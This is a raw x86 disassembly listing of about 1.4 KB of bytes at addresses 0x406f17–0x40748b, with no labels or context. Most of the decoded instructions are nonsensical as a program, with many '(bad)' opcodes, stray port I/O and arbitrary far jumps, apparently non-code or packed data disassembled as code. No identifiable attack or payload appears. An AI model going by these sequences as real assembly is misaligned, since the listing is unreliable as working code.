  406f17:	3e a4                	movsb  %ds:(%esi),%es:(%edi)
  406f19:	02 f7                	add    %bh,%dh
  406f1b:	e3 bb                	jecxz  0x406ed8
  406f1d:	38 83 07 90 b8 de    	cmp    %al,-0x21476ff9(%ebx)
  406f23:	b2 8b                	mov    $0x8b,%dl
  406f25:	d1 7e 08             	sarl   $1,0x8(%esi)
  406f28:	89 eb                	mov    %ebp,%ebx
  406f2a:	2d bb 14 ed df       	sub    $0xdfed14bb,%eax
  406f2f:	20 71 bd             	and    %dh,-0x43(%ecx)
  406f32:	65 97                	gs xchg %eax,%edi
  406f34:	a3 fd 28 12 d7       	mov    %eax,0xd71228fd
  406f39:	5b                   	pop    %ebx
  406f3a:	76 25                	jbe    0x406f61
  406f3c:	da 63 48             	fisubl 0x48(%ebx)
  406f3f:	05 9e 60 57 a1       	add    $0xa157609e,%eax
  406f44:	fd                   	std
  406f45:	24 52                	and    $0x52,%al
  406f47:	81 a7 d8 35 68 3f 8d 	andl   $0x19e0548d,0x3f6835d8(%edi)
  406f4e:	54 e0 19 
  406f51:	fe                   	(bad)
  406f52:	37                   	aaa
  406f53:	75 c3                	jne    0x406f18
  406f55:	ef                   	out    %eax,(%dx)
  406f56:	90                   	nop
  406f57:	0a 3c cb             	or     (%ebx,%ecx,8),%bh
  406f5a:	ae                   	scas   %es:(%edi),%al
  406f5b:	43                   	inc    %ebx
  406f5c:	3e c7                	ds (bad)
  406f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  406f5f:	40                   	inc    %eax
  406f60:	e5 f7                	in     $0xf7,%eax
  406f62:	48                   	dec    %eax
  406f63:	05 9e 67 37 a2       	add    $0xa237679e,%eax
  406f68:	fd                   	std
  406f69:	02 52 81             	add    -0x7f(%edx),%dl
  406f6c:	3f                   	aas
  406f6d:	b0 9b                	mov    $0x9b,%al
  406f6f:	d0 7e 11             	sarb   $1,0x11(%esi)
  406f72:	a9 c0 21 76 33       	test   $0x337621c0,%eax
  406f77:	da 2f                	fisubrl (%edi)
  406f79:	23 71 75             	and    0x75(%ecx),%esi
  406f7c:	65 b7 a2             	gs mov $0xa2,%bh
  406f7f:	fd                   	std
  406f80:	0a 12                	or     (%edx),%dl
  406f82:	57                   	push   %edi
  406f83:	57                   	push   %edi
  406f84:	76 1b                	jbe    0x406fa1
  406f86:	da 7f 42             	fidivrl 0x42(%edi)
  406f89:	e2 ea                	loop   0x406f75
  406f8b:	ca ee 40             	lret   $0x40ee
  406f8e:	be ce ee 42 e5       	mov    $0xe542eece,%esi
  406f93:	0d 24 ae ae ec       	or     $0xecaeae24,%eax
  406f98:	1e                   	push   %ds
  406f99:	b4 df                	mov    $0xdf,%ah
  406f9b:	44                   	inc    %esp
  406f9c:	e2 ea                	loop   0x406f88
  406f9e:	ca ee 43             	lret   $0x43ee
  406fa1:	7b 1c                	jnp    0x406fbf
  406fa3:	a9 c0 db ec 01       	test   $0x1ecdbc0,%eax
  406fa8:	b4 df                	mov    $0xdf,%ah
  406faa:	41                   	inc    %ecx
  406fab:	2a f0                	sub    %al,%dh
  406fad:	2e 7b 08             	jnp,pn 0x406fb8
  406fb0:	ed                   	in     (%dx),%eax
  406fb1:	f7 90 0a bc cf 7e    	notl   0x7ecfbc0a(%eax)
  406fb7:	83 f6 07             	xor    $0x7,%esi
  406fba:	48                   	dec    %eax
  406fbb:	5c                   	pop    %esp
  406fbc:	57                   	push   %edi
  406fbd:	d9 a3 c8 bf b1 31    	fldenv 0x31b1bfc8(%ebx)
  406fc3:	54                   	push   %esp
  406fc4:	3e 44                	ds inc %esp
  406fc6:	2a f0                	sub    %al,%dh
  406fc8:	77 fe                	ja     0x406fc8
  406fca:	f7 88 c3 47 48 5c 57 	testl  $0x6813d957,0x5c4847c3(%eax)
  406fd1:	d9 13 68 
  406fd4:	7f 82                	jg     0x406f58
  406fd6:	c4 75 95             	les    -0x6b(%ebp),%esi
  406fd9:	3d 85 f6 a7 48       	cmp    $0x48a7f685,%eax
  406fde:	5c                   	pop    %esp
  406fdf:	57                   	push   %edi
  406fe0:	d9 33                	fnstenv (%ebx)
  406fe2:	68 7f 86 c4 75       	push   $0x75c4867f
  406fe7:	95                   	xchg   %eax,%ebp
  406fe8:	3d 8b f6 e7 48       	cmp    $0x48e7f68b,%eax
  406fed:	05 be 60 bf 47       	add    $0x47bf60be,%eax
  406ff2:	fb                   	sti
  406ff3:	4b                   	dec    %ebx
  406ff4:	24 ae                	and    $0xae,%al
  406ff6:	b1 ec                	mov    $0xec,%cl
  406ff8:	05 b4 bf 42 e2       	add    $0xe242bfb4,%eax
  406ffd:	ba ca 5e 44 fb       	mov    $0xfb445eca,%edx
  407002:	3b 24 ae             	cmp    (%esi,%ebp,4),%esp
  407005:	ab                   	stos   %eax,%es:(%edi)
  407006:	ec                   	in     (%dx),%al
  407007:	8f 68 1f 41          	(bad)
  40700b:	f2 7f 04             	bnd jg 0x407012
  40700e:	ea 65 b4 19 52 01 45 	ljmp   $0x4501,$0x5219b465
  407015:	79 05                	jns    0x40701c
  407017:	69 50 fe c4 ff 5d 54 	imul   $0x545dffc4,-0x2(%eax),%edx
  40701e:	24 ae                	and    $0xae,%al
  407020:	ab                   	stos   %eax,%es:(%edi)
  407021:	ca eb 8c             	lret   $0x8ceb
  407024:	ff                   	(bad)
  407025:	bb 81 af a3 6d       	mov    $0x6da3af81,%ebx
  40702a:	51                   	push   %ecx
  40702b:	fe 8c 76 08 12 77 89 	decb   -0x7688edf8(%esi,%esi,2)
  407032:	ca 5b 68             	lret   $0x685b
  407035:	87 21                	xchg   %esp,(%ecx)
  407037:	71 8d                	jno    0x406fc6
  407039:	55                   	push   %ebp
  40703a:	0e                   	push   %cs
  40703b:	a3 1d 81 c4 35       	mov    %eax,0x35c4811d
  407040:	56                   	push   %esi
  407041:	79 1b                	jns    0x40705e
  407043:	ed                   	in     (%dx),%eax
  407044:	28 a4 02 d1 ca bb 68 	sub    %ah,0x68bbcad1(%edx,%eax,1)
  40704b:	5b                   	pop    %ebx
  40704c:	91                   	xchg   %eax,%ecx
  40704d:	b8 ba 2a ef a3       	mov    $0xa3ef2aba,%eax
  407052:	6d                   	insl   (%dx),%es:(%edi)
  407053:	43                   	inc    %ebx
  407054:	e2 ea                	loop   0x407040
  407056:	aa                   	stos   %al,%es:(%edi)
  407057:	fc                   	cld
  407058:	15 ed 58 24 ae       	adc    $0xae2458ed,%eax
  40705d:	ae                   	scas   %es:(%edi),%al
  40705e:	ca 87 48             	lret   $0x4887
  407061:	bb f2 11 2a f1       	mov    $0xf12a11f2,%ebx
  407066:	48                   	dec    %eax
  407067:	5c                   	pop    %esp
  407068:	69 95 4f d0 4e 44 e2 	imul   $0x7cab4ae2,0x444ed04f(%ebp),%edx
  40706f:	4a ab 7c 
  407072:	8a 76 32             	mov    0x32(%esi),%dh
  407075:	12 57 57             	adc    0x57(%edi),%dl
  407078:	e5 33                	in     $0x33,%eax
  40707a:	b4 d3                	mov    $0xd3,%ah
  40707c:	91                   	xchg   %eax,%ecx
  40707d:	0a 64 28 9f          	or     -0x61(%eax,%ebp,1),%ah
  407081:	a3 9d 89 54 20       	mov    %eax,0x2054899d
  407086:	4b                   	dec    %ebx
  407087:	f9                   	stc
  407088:	12 ed                	adc    %ch,%ch
  40708a:	59                   	pop    %ecx
  40708b:	48                   	dec    %eax
  40708c:	05 66 2b 5f f1       	add    $0xf15f2b66,%eax
  407091:	d5 55                	aad    $0x55
  407093:	f9                   	stc
  407094:	86 af ae 48 05 b2    	xchg   %ch,-0x4dfab752(%edi)
  40709a:	95                   	xchg   %eax,%ebp
  40709b:	ef                   	out    %eax,(%dx)
  40709c:	d0 9e 87 c4 95 56    	rcrb   $1,0x5695c487(%esi)
  4070a2:	39 c2                	cmp    %eax,%edx
  4070a4:	57                   	push   %edi
  4070a5:	5a                   	pop    %edx
  4070a6:	24 ae                	and    $0xae,%al
  4070a8:	b4 0a                	mov    $0xa,%ah
  4070aa:	53                   	push   %ebx
  4070ab:	70 a5                	jo     0x407052
  4070ad:	45                   	inc    %ebp
  4070ae:	e2 4a                	loop   0x4070fa
  4070b0:	ab                   	stos   %eax,%es:(%edi)
  4070b1:	18 d0                	sbb    %dl,%al
  4070b3:	5e                   	pop    %esi
  4070b4:	88 c4                	mov    %al,%ah
  4070b6:	95                   	xchg   %eax,%ebp
  4070b7:	56                   	push   %esi
  4070b8:	31 a1 5d 80 54 60    	xor    %esp,0x6054805d(%ecx)
  4070be:	a9 62 41 7b 19       	test   $0x197b4162,%eax
  4070c3:	12 d7                	adc    %bh,%dl
  4070c5:	52                   	push   %edx
  4070c6:	25 14 ed 15 48       	and    $0x4815ed14,%eax
  4070cb:	5c                   	pop    %esp
  4070cc:	4b                   	dec    %ebx
  4070cd:	95                   	xchg   %eax,%ebp
  4070ce:	70 b4                	jo     0x407084
  4070d0:	57                   	push   %edi
  4070d1:	21 71 2d             	and    %esi,0x2d(%ecx)
  4070d4:	55                   	push   %ebp
  4070d5:	22 d1                	and    %cl,%dl
  4070d7:	2e 45                	cs inc %ebp
  4070d9:	e2 5a                	loop   0x407135
  4070db:	aa                   	stos   %al,%es:(%edi)
  4070dc:	cc                   	int3
  4070dd:	40                   	inc    %eax
  4070de:	7b 0d                	jnp    0x4070ed
  4070e0:	12 f7                	adc    %bh,%dh
  4070e2:	ae                   	scas   %es:(%edi),%al
  4070e3:	8a 15 ed 72 24 ee    	mov    0xee2472ed,%dl
  4070e9:	5d                   	pop    %ebp
  4070ea:	15 1b da 95 48       	adc    $0x4895da1b,%eax
  4070ef:	dc b5 2a b1 68 57    	fdivl  0x5768b12a(%ebp)
  4070f5:	23 71 d7             	and    -0x29(%ecx),%esi
  4070f8:	aa                   	stos   %al,%es:(%edi)
  4070f9:	d8 d1                	fcom   %st(1)
  4070fb:	5e                   	pop    %esi
  4070fc:	87 c4                	xchg   %eax,%esp
  4070fe:	5d                   	pop    %ebp
  4070ff:	ab                   	stos   %eax,%es:(%edi)
  407100:	92                   	xchg   %eax,%edx
  407101:	80 76 2d 12          	xorb   $0x12,0x2d(%esi)
  407105:	77 ad                	ja     0x4070b4
  407107:	4a                   	dec    %edx
  407108:	12 da                	adc    %dl,%bl
  40710a:	f5                   	cmc
  40710b:	c8 6f ec 57          	enter  $0xec6f,$0x57
  40710f:	db e7                	(bad)
  407111:	e2 7c                	loop   0x40718f
  407113:	5a                   	pop    %edx
  407114:	a8 94                	test   $0x94,%al
  407116:	31 0f                	xor    %ecx,(%edi)
  407118:	bc 1d cb 9f 82       	mov    $0x829fcb1d,%esp
  40711d:	db 21                	(bad) (%ecx)
  40711f:	22 8d ff 3b 15 3d    	and    0x3d153bff(%ebp),%cl
  407125:	70 cc                	jo     0x4070f3
  407127:	2c be                	sub    $0xbe,%al
  407129:	8a 7b e1             	mov    -0x1f(%ebx),%bh
  40712c:	24 2b                	and    $0x2b,%al
  40712e:	3f                   	aas
  40712f:	1e                   	push   %ds
  407130:	0f 7b                	(bad)
  407132:	f9                   	stc
  407133:	3f                   	aas
  407134:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407135:	1a e0                	sbb    %al,%ah
  407137:	df 65 d5             	fbld   -0x2b(%ebp)
  40713a:	ff c7                	inc    %edi
  40713c:	ff cd                	dec    %ebp
  40713e:	01 a3 ce df a6 5c    	add    %esp,0x5ca6dfce(%ebx)
  407144:	63 e6                	arpl   %esp,%esi
  407146:	c7                   	(bad)
  407147:	89 5a 79             	mov    %ebx,0x79(%edx)
  40714a:	fc                   	cld
  40714b:	0f 35                	sysexit
  40714d:	bf f2 70 c6 64       	mov    $0x64c670f2,%edi
  407152:	ed                   	in     (%dx),%eax
  407153:	ee                   	out    %al,(%dx)
  407154:	38 7e 0c             	cmp    %bh,0xc(%esi)
  407157:	9b                   	fwait
  407158:	a0 3d 33 45 7b       	mov    0x7b45333d,%al
  40715d:	5f                   	pop    %edi
  40715e:	24 4f                	and    $0x4f,%al
  407160:	d6                   	salc
  407161:	b6 d9                	mov    $0xd9,%dh
  407163:	f8                   	clc
  407164:	31 17                	xor    %edx,(%edi)
  407166:	d5 f9                	aad    $0xf9
  407168:	f8                   	clc
  407169:	36 b1 00             	ss mov $0x0,%cl
  40716c:	7f f2                	jg     0x407160
  40716e:	f0 ed                	lock in (%dx),%eax
  407170:	61                   	popa
  407171:	21 64 42 3e          	and    %esp,0x3e(%edx,%eax,2)
  407175:	2a 05 f8 53 88 ea    	sub    0xea8853f8,%al
  40717b:	8b d0                	mov    %eax,%edx
  40717d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40717e:	d0 09                	rorb   $1,(%ecx)
  407180:	ad                   	lods   %ds:(%esi),%eax
  407181:	4d                   	dec    %ebp
  407182:	ae                   	scas   %es:(%edi),%al
  407183:	6e                   	outsb  %ds:(%esi),(%dx)
  407184:	bf ab 30 1f 56       	mov    $0x561f30ab,%edi
  407189:	ac                   	lods   %ds:(%esi),%al
  40718a:	ea 68 6f 2f f7 f8 fb 	ljmp   $0xfbf8,$0xf72f6f68
  407191:	ba 5d bb cb ba       	mov    $0xbacbbb5d,%edx
  407196:	5d                   	pop    %ebp
  407197:	7e 7f                	jle    0x407218
  407199:	41                   	inc    %ecx
  40719a:	71 fb                	jno    0x407197
  40719c:	14 6a                	adc    $0x6a,%al
  40719e:	e1 52                	loope  0x4071f2
  4071a0:	ae                   	scas   %es:(%edi),%al
  4071a1:	e6 75                	out    %al,$0x75
  4071a3:	f4                   	hlt
  4071a4:	7b 7d                	jnp    0x407223
  4071a6:	ab                   	stos   %eax,%es:(%edi)
  4071a7:	36 b7 a3             	ss mov $0xa3,%bh
  4071aa:	5d                   	pop    %ebp
  4071ab:	59                   	pop    %ecx
  4071ac:	5d                   	pop    %ebp
  4071ad:	d7                   	xlat   %ds:(%ebx)
  4071ae:	be d1 51 dd 5c       	mov    $0x5cdd51d1,%esi
  4071b3:	00 eb                	add    %ch,%bl
  4071b5:	6b 36 b5             	imul   $0xffffffb5,(%esi),%esi
  4071b8:	37                   	aaa
  4071b9:	d4 57                	aam    $0x57
  4071bb:	d7                   	xlat   %ds:(%ebx)
  4071bc:	35 57 34 36 b5       	xor    $0xb5363457,%eax
  4071c1:	17                   	pop    %ss
  4071c2:	40                   	inc    %eax
  4071c3:	75 45                	jne    0x40720a
  4071c5:	ef                   	out    %eax,(%dx)
  4071c6:	40                   	inc    %eax
  4071c7:	8f                   	(bad)
  4071c8:	db e7                	(bad)
  4071ca:	da dc                	fcmovu %st(4),%st
  4071cc:	ed                   	in     (%dx),%eax
  4071cd:	76 16                	jbe    0x4071e5
  4071cf:	40                   	inc    %eax
  4071d0:	8d                   	lea    (bad),%eax
  4071d1:	c7                   	(bad)
  4071d2:	df 8f 87 c6 b2 c5    	fisttps -0x3a4d3979(%edi)
  4071d8:	45                   	inc    %ebp
  4071d9:	85 50 dd             	test   %edx,-0x23(%eax)
  4071dc:	db 8f 6c 2c 2b 0c    	fisttpl 0xc2b2c6c(%edi)
  4071e2:	9e                   	sahf
  4071e3:	8d                   	lea    (bad),%edx
  4071e4:	d6                   	salc
  4071e5:	40                   	inc    %eax
  4071e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4071e7:	87 b3 10 ca 3d 1d    	xchg   %esi,0x1d3dca10(%ebx)
  4071ed:	fd                   	std
  4071ee:	1e                   	push   %ds
  4071ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4071f0:	af                   	scas   %es:(%edi),%eax
  4071f1:	cb                   	lret
  4071f2:	b7 1b                	mov    $0x1b,%bh
  4071f4:	9d                   	popf
  4071f5:	09 2d 16 c1 86 9e    	or     %ebp,0x9e86c116
  4071fb:	be 8e 75 7e 57       	mov    $0x577e758e,%esi
  407200:	11 94 fb fb 07 96 14 	adc    %edx,0x149607fb(%ebx,%edi,8)
  407207:	17                   	pop    %ss
  407208:	2e 82 16 6c          	adcb   $0x6c,%cs:(%esi)
  40720c:	a9 78 11 b6 b4       	test   $0xb4b61178,%eax
  407211:	08 9a 6a 17 c1 16    	or     %bl,0x16c1176a(%edx)
  407217:	77 7f                	ja     0x407298
  407219:	7b 7f                	jnp    0x40729a
  40721b:	47                   	inc    %edi
  40721c:	5f                   	pop    %edi
  40721d:	99                   	cltd
  40721e:	b7 b7                	mov    $0xb7,%bh
  407220:	d7                   	xlat   %ds:(%ebx)
  407221:	4d                   	dec    %ebp
  407222:	cd 54                	int    $0x54
  407224:	37                   	aaa
  407225:	6c                   	insb   (%dx),%es:(%edi)
  407226:	58                   	pop    %eax
  407227:	04 fe                	add    $0xfe,%al
  407229:	29 55 5e             	sub    %edx,0x5e(%ebp)
  40722c:	77 a0                	ja     0x4071ce
  40722e:	73 aa                	jae    0x4071da
  407230:	ba 93 d5 32 97       	mov    $0x9732d593,%edx
  407235:	bf 7f 31 54 95       	mov    $0x9554317f,%edi
  40723a:	15 2e 2e c6 6b       	adc    $0x6bc62e2e,%eax
  40723f:	15 93 5f 0c 6b       	adc    $0x6b0c5f93,%eax
  407244:	bd fe fe c2 92       	mov    $0x92c2fefe,%ebp
  407249:	82 45 4b a0          	addb   $0xa0,0x4b(%ebp)
  40724d:	6c                   	insb   (%dx),%es:(%edi)
  40724e:	ab                   	stos   %eax,%es:(%edi)
  40724f:	ab                   	stos   %eax,%es:(%edi)
  407250:	63 ab 6b c9 e2 a2    	arpl   %ebp,-0x5d1d3695(%ebx)
  407256:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407257:	b0 a2                	mov    $0xa2,%al
  407259:	d6                   	salc
  40725a:	db 39                	fstpt  (%ecx)
  40725c:	d0 ed                	shr    $1,%ch
  40725e:	5e                   	pop    %esi
  40725f:	05 e5 15 35 15       	add    $0x153515e5,%eax
  407264:	cd 15                	int    $0x15
  407266:	ed                   	in     (%dx),%eax
  407267:	cd 65                	int    $0x65
  407269:	6b 60 6d 19          	imul   $0x19,0x6d(%eax),%esp
  40726d:	94                   	xchg   %eax,%esp
  40726e:	d5 38                	aad    $0x38
  407270:	9a 9a aa cb a0 a2 a9 	lcall  $0xa9a2,$0xa0cbaa9a
  407277:	d9 b1 a6 a6 ba a9    	fnstenv -0x5645595a(%ecx)
  40727d:	aa                   	stos   %al,%es:(%edi)
  40727e:	a2 1c b5 fa 26       	mov    %al,0x26fab51c
  407283:	7e a8                	jle    0x40722d
  407285:	af                   	scas   %es:(%edi),%eax
  407286:	ab                   	stos   %eax,%es:(%edi)
  407287:	ab                   	stos   %eax,%es:(%edi)
  407288:	28 6b 46             	sub    %ch,0x46(%ebx)
  40728b:	8b 87 54 b5 b1 ba    	mov    -0x454e4aac(%edi),%eax
  407291:	9c                   	pushf
  407292:	a2 20 a3 a1 7e       	mov    %al,0x7ea1a320
  407297:	63 45 63             	arpl   %eax,0x63(%ebp)
  40729a:	7b 53                	jnp    0x4072ef
  40729c:	4b                   	dec    %ebx
  40729d:	53                   	push   %ebx
  40729e:	43                   	inc    %ebx
  40729f:	45                   	inc    %ebp
  4072a0:	5d                   	pop    %ebp
  4072a1:	39 b4 d4 95 d5 d7 36 	cmp    %esi,0x36d7d595(%esp,%edx,8)
  4072a8:	34 56                	xor    $0x56,%al
  4072aa:	34 e1                	xor    $0xe1,%al
  4072ac:	69 ed 5c 50 8b d7    	imul   $0xd78b505c,%ebp,%ebp
  4072b2:	34 d5                	xor    $0xd5,%al
  4072b4:	97                   	xchg   %eax,%edi
  4072b5:	43                   	inc    %ebx
  4072b6:	53                   	push   %ebx
  4072b7:	5b                   	pop    %ebx
  4072b8:	5d                   	pop    %ebp
  4072b9:	7b 63                	jnp    0x40731e
  4072bb:	d9 86 72 a8 ad a8    	flds   -0x5752578e(%esi)
  4072c1:	6d                   	insl   (%dx),%es:(%edi)
  4072c2:	af                   	scas   %es:(%edi),%eax
  4072c3:	68 ad 28 6b c7       	push   $0xc76b28ad
  4072c8:	6b d4 d4             	imul   $0xffffffd4,%esp,%edx
  4072cb:	94                   	xchg   %eax,%esp
  4072cc:	d5 97                	aad    $0x97
  4072ce:	57                   	push   %edi
  4072cf:	50                   	push   %eax
  4072d0:	37                   	aaa
  4072d1:	a2 5c df d8 d6       	mov    %al,0xd6d8df5c
  4072d6:	de e4                	fsubp  %st,%st(4)
  4072d8:	a8 ac                	test   $0xac,%al
  4072da:	80 96 26 3c ab a1 b1 	adcb   $0xb1,-0x5e54c3da(%esi)
  4072e1:	be b2 ba a6 02       	mov    $0x2a6bab2,%esi
  4072e6:	2a 6b db             	sub    -0x25(%ebx),%ch
  4072e9:	cb                   	lret
  4072ea:	eb 37                	jmp    0x407323
  4072ec:	d6                   	salc
  4072ed:	d5 d4                	aad    $0xd4
  4072ef:	3b ca                	cmp    %edx,%ecx
  4072f1:	db a5 d0 58 51 e7    	(bad) -0x18aea730(%ebp)
  4072f7:	a8 ad                	test   $0xad,%al
  4072f9:	08 ba 22 15 e9 62    	or     %bh,0x62e91522(%edx)
  4072ff:	0a 8d cd aa b7 ae    	or     -0x51485533(%ebp),%cl
  407305:	a2 ad a6 7e 6d       	mov    %al,0x6d7ea6ad
  40730a:	7b 7d                	jnp    0x407389
  40730c:	65 65 4d             	gs gs dec %ebp
  40730f:	75 5d                	jne    0x40736e
  407311:	05 d4 d5 23 82       	add    $0x8223d5d4,%eax
  407316:	01 d4                	add    %edx,%esp
  407318:	3a ea                	cmp    %dl,%ch
  40731a:	1c 6b                	sbb    $0x6b,%al
  40731c:	31 d2                	xor    %edx,%edx
  40731e:	06                   	push   %es
  40731f:	9d                   	popf
  407320:	56                   	push   %esi
  407321:	e7 68                	out    %eax,$0x68
  407323:	ae                   	scas   %es:(%edi),%al
  407324:	de 50 c1             	ficoms -0x3f(%eax)
  407327:	25 35 f6 aa ea       	and    $0xeaaaf635,%eax
  40732c:	35 15 8d 28 56       	xor    $0x56288d15,%eax
  407331:	40                   	inc    %eax
  407332:	55                   	push   %ebp
  407333:	f9                   	stc
  407334:	c6                   	(bad)
  407335:	f6 75 6b             	divb   0x6b(%ebp)
  407338:	78 53                	js     0x40738d
  40733a:	d8 c5                	fadd   %st(5),%st
  40733c:	ed                   	in     (%dx),%eax
  40733d:	65 8e 86 e6 96 c6 0a 	mov    %gs:0xac696e6(%esi),%es
  407344:	72 b5                	jb     0x4072fb
  407346:	8b 40 6d             	mov    0x6d(%eax),%eax
  407349:	75 13                	jne    0x40735e
  40734b:	26 56                	es push %esi
  40734d:	d6                   	salc
  40734e:	58                   	pop    %eax
  40734f:	51                   	push   %ecx
  407350:	81 01 97 ad c3 06    	addl   $0x6c3ad97,(%ecx)
  407356:	b8 ca 4f ad 6d       	mov    $0x6dad4fca,%eax
  40735b:	52                   	push   %edx
  40735c:	4f                   	dec    %edi
  40735d:	ad                   	lods   %ds:(%esi),%eax
  40735e:	6d                   	insl   (%dx),%es:(%edi)
  40735f:	df 50 5d             	fists  0x5d(%eax)
  407362:	b1 91                	mov    $0x91,%cl
  407364:	6c                   	insb   (%dx),%es:(%edi)
  407365:	ec                   	in     (%dx),%al
  407366:	e6 e6                	out    %al,$0xe6
  407368:	8a ba ea ba b5 d4    	mov    -0x2b4a4516(%edx),%bh
  40736e:	d3 fc                	sar    %cl,%esp
  407370:	c8 83 af aa          	enter  $0xaf83,$0xaa
  407374:	6f                   	outsl  %ds:(%esi),(%dx)
  407375:	6c                   	insb   (%dx),%es:(%edi)
  407376:	2e 6b 69 6e 6f       	imul   $0x6f,%cs:0x6e(%ecx),%ebp
  40737b:	70 34                	jo     0x4073b1
  40737d:	57                   	push   %edi
  40737e:	51                   	push   %ecx
  40737f:	8f                   	(bad)
  407380:	3b 9a ca aa ab a1    	cmp    -0x5e545536(%edx),%ebx
  407386:	c6                   	(bad)
  407387:	eb ea                	jmp    0x407373
  407389:	f4                   	hlt
  40738a:	f4                   	hlt
  40738b:	6e                   	outsb  %ds:(%esi),(%dx)
  40738c:	71 34                	jno    0x4073c2
  40738e:	a0 e9 68 6a 6e       	mov    0x6e6a68e9,%al
  407393:	77 94                	ja     0x407329
  407395:	ad                   	lods   %ds:(%esi),%eax
  407396:	e3 d5                	jecxz  0x40736d
  407398:	d7                   	xlat   %ds:(%ebx)
  407399:	56                   	push   %esi
  40739a:	34 b7                	xor    $0xb7,%al
  40739c:	97                   	xchg   %eax,%edi
  40739d:	57                   	push   %edi
  40739e:	37                   	aaa
  40739f:	ad                   	lods   %ds:(%esi),%eax
  4073a0:	9b                   	fwait
  4073a1:	9c                   	pushf
  4073a2:	55                   	push   %ebp
  4073a3:	79 4d                	jns    0x4073f2
  4073a5:	cd a4                	int    $0xa4
  4073a7:	b4 b8                	mov    $0xb8,%ah
  4073a9:	86 c1                	xchg   %al,%cl
  4073ab:	f3 93                	repz xchg %eax,%ebx
  4073ad:	ca 1c b5             	lret   $0xb51c
  4073b0:	d4 7a                	aam    $0x7a
  4073b2:	23 1e                	and    (%esi),%ebx
  4073b4:	f9                   	stc
  4073b5:	b8 d5 95 57 37       	mov    $0x375795d5,%eax
  4073ba:	57                   	push   %edi
  4073bb:	d7                   	xlat   %ds:(%ebx)
  4073bc:	d7                   	xlat   %ds:(%ebx)
  4073bd:	39 6a b0             	cmp    %ebp,-0x50(%edx)
  4073c0:	81 e6 b2 aa 9a 8a    	and    $0x8a9aaab2,%esi
  4073c6:	3a 9c 21 95 8e 96 9a 	cmp    -0x6569716b(%ecx,%eiz,1),%bl
  4073cd:	e6 f6                	out    %al,$0xf6
  4073cf:	aa                   	stos   %al,%es:(%edi)
  4073d0:	0a 47 79             	or     0x79(%edi),%al
  4073d3:	45                   	inc    %ebp
  4073d4:	23 57 ca             	and    -0x36(%edi),%edx
  4073d7:	36 d6                	ss salc
  4073d9:	37                   	aaa
  4073da:	96                   	xchg   %eax,%esi
  4073db:	b7 73                	mov    $0x73,%bh
  4073dd:	8b 0f                	mov    (%edi),%ecx
  4073df:	d9 06                	flds   (%esi)
  4073e1:	9c                   	pushf
  4073e2:	f5                   	cmc
  4073e3:	78 0a                	js     0x4073ef
  4073e5:	8e c6                	mov    %esi,%es
  4073e7:	86 6a 6e             	xchg   %ch,0x6e(%edx)
  4073ea:	a8 d9                	test   $0xd9,%al
  4073ec:	57                   	push   %edi
  4073ed:	d7                   	xlat   %ds:(%ebx)
  4073ee:	55                   	push   %ebp
  4073ef:	d6                   	salc
  4073f0:	37                   	aaa
  4073f1:	62 1b                	bound  %ebx,(%ebx)
  4073f3:	5c                   	pop    %esp
  4073f4:	50                   	push   %eax
  4073f5:	fb                   	sti
  4073f6:	90                   	nop
  4073f7:	f7 44 3b 9e b9 0e 07 	testl  $0x86070eb9,-0x62(%ebx,%edi,1)
  4073fe:	86 
  4073ff:	e4 b2                	in     $0xb2,%al
  407401:	c6 06 1c             	movb   $0x1c,(%esi)
  407404:	b3 b2                	mov    $0xb2,%bl
  407406:	c6                   	(bad)
  407407:	b6 86                	mov    $0x86,%dh
  407409:	a0 5b 51 17 74       	mov    0x7417515b,%al
  40740e:	65 47                	gs inc %edi
  407410:	d7                   	xlat   %ds:(%ebx)
  407411:	4d                   	dec    %ebp
  407412:	e8 e7 ba 60 37       	call   0x37a12efe
  407417:	d7                   	xlat   %ds:(%ebx)
  407418:	4d                   	dec    %ebp
  407419:	d5 cb                	aad    $0xcb
  40741b:	75 c1                	jne    0x4073de
  40741d:	4e                   	dec    %esi
  40741e:	ae                   	scas   %es:(%edi),%al
  40741f:	d3 fa                	sar    %cl,%edx
  407421:	58                   	pop    %eax
  407422:	06                   	push   %es
  407423:	d0 54 d5 d2          	rclb   $1,-0x2e(%ebp,%edx,8)
  407427:	cc                   	int3
  407428:	e7 90                	out    %eax,$0x90
  40742a:	7a a2                	jp     0x4073ce
  40742c:	a3 a5 bc ba 9e       	mov    %eax,0x9ebabca5
  407431:	e6 14                	out    %al,$0x14
  407433:	34 ed                	xor    $0xed,%al
  407435:	f6 f7                	div    %bh
  407437:	bb 7b f2 aa eb       	mov    $0xebaaf27b,%ebx
  40743c:	31 d7                	xor    %edx,%edi
  40743e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40743f:	75 cd                	jne    0x40740e
  407441:	f5                   	cmc
  407442:	0d fa 1a 2d c2       	or     $0xc22d1afa,%eax
  407447:	ab                   	stos   %eax,%es:(%edi)
  407448:	aa                   	stos   %al,%es:(%edi)
  407449:	2e c7                	cs (bad)
  40744b:	db c4                	fcmovnb %st(4),%st
  40744d:	d1 b4 6e 8d a3 51 5c 	shll   $1,0x5c51a38d(%esi,%ebp,2)
  407454:	ba aa 7e 63 50       	mov    $0x50637eaa,%edx
  407459:	e1 3d                	loope  0x407498
  40745b:	d1 d4                	rcl    $1,%esp
  40745d:	dc 58 e1             	fcompl -0x1f(%eax)
  407460:	a8 c5                	test   $0xc5,%al
  407462:	11 6c 5f d3          	adc    %ebp,-0x2d(%edi,%ebx,2)
  407466:	52                   	push   %edx
  407467:	59                   	pop    %ecx
  407468:	59                   	pop    %ecx
  407469:	21 ab 61 37 6f 74    	and    %ebp,0x746f3761(%ebx)
  40746f:	d4 d4                	aam    $0xd4
  407471:	34 38                	xor    $0x38,%al
  407473:	1a 2a                	sbb    (%edx),%ch
  407475:	1a 27                	sbb    (%edi),%ah
  407477:	f4                   	hlt
  407478:	58                   	pop    %eax
  407479:	ad                   	lods   %ds:(%esi),%eax
  40747a:	e3 a8                	jecxz  0x407424
  40747c:	fa                   	cli
  40747d:	1f                   	pop    %ds
  40747e:	28 d5                	sub    %dl,%ch
  407480:	75 a8                	jne    0x40742a
  407482:	c8 89 de 04          	enter  $0xde89,$0x4
  407486:	d5 75                	aad    $0x75
  407488:	47                   	inc    %edi
  407489:	e1 3d                	loope  0x4074c8
  40748b:	47                   	inc    %edi
